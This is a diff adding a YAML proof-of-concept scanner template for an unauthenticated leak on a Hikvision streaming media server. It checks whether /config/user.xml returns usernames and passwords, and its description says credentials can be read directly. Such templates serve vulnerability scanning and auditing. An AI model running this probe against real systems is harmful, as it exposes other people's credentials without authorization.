@@ -1,0 +1,19 @@
+name: poc-yaml-hikvision-info-leak
+set:
+    r1: randomLowercase(16)
+rules:
+  - method: GET
+    path: /xxid/{{r1}}
+    follow_redirects: false
+    expression: |
+      response.status == 404 && response.body.bcontains(b"File not found") 
+  - method: GET
+    path: /config/user.xml
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(b"<user name=\"") && response.body.bcontains(b" password=\"")
+detail:
+  author: tangshoupu
+  info: Hikvision 流媒体管理服务器未授权敏感信息泄露，可以直接获取用户的用户名和密码
+  links:
+    - https://github.com/test502git/
